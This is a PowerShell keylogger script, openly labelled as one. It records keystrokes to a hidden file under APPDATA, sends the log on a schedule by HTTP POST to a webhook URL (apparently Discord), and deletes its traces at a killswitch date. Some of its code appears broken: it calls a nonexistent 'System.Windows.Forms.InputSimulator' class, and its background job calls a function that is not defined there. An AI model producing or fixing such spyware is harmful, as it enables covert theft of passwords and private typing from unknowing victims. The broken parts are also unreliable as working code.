<#
.SYNOPSIS
  PowerShell Keylogger with log schedule and killswitch
#>

$dc = $env:DC_WEBHOOK
$log = $env:LOG_TIME
$ks  = $env:KILLSWITCH
$fn  = "$env:APPDATA\kl_" + [System.Guid]::NewGuid().ToString() + ".log"

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$null = [System.Windows.Forms.Application]::EnableVisualStyles()

function sK {
    $x = ""
    $lh = [System.Windows.Forms.Keys]
    while ($true) {
        Start-Sleep -Milliseconds 10
        foreach ($k in [Enum]::GetValues($lh)) {
            if ([System.Windows.Forms.Control]::IsKeyLocked($k) -or [System.Windows.Forms.Control]::ModifierKeys) {
                if ([System.Windows.Forms.InputSimulator]::IsKeyDown($k)) {
                    $x += "$k " | Out-File -Append $fn
                }
            }
        }
    }
}

Start-Job -ScriptBlock { sK }

function sL {
    while ($true) {
        $now = Get-Date -Format "hh:mm tt"
        if ($now -eq $log) {
            try {
                $payload = Get-Content $fn -Raw
                Invoke-RestMethod -Uri $dc -Method POST -Body @{ content = "Keylog: `n$payload" }
                Remove-Item $fn -Force -ErrorAction SilentlyContinue
            } catch {}
        }

        if ($ks -ne "" -and (Get-Date) -ge (Get-Date $ks)) {
            Remove-Item $fn -Force -ErrorAction SilentlyContinue
            Stop-Process -Id $PID -Force
        }

        Start-Sleep -Seconds 60
    }
}
sL
